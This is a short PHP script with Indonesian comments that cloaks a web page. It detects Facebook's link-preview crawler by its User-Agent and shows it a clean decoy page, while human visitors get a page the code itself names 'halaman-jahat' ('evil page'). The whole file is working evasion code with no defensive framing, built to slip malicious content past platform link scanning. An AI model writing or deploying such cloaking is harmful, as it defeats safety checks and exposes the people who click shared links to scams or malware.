<?php
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// Deteksi bot Facebook
if (strpos($userAgent, 'facebookexternalhit') !== false) {
    // Tampilkan halaman palsu untuk bot
    include 'halaman-bersih.html';
} else {
    // Tampilkan halaman asli untuk manusia
    include 'halaman-jahat.html';
}
?>